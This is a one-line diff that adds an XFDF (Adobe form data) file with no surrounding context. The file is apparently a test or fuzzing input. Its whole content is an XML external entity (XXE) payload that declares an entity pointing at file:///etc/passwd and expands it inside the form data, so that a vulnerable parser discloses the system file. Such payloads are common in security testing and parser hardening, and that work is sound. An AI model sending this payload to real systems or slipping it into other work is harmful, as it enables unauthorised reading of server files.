@@ -1,0 +1,1 @@
+<!DOCTYPE xfdf [<!ENTITY x SYSTEM "file:///etc/passwd">]><xfdf xmlns="http://ns.adobe.com/xfdf/">&x;</xfdf>
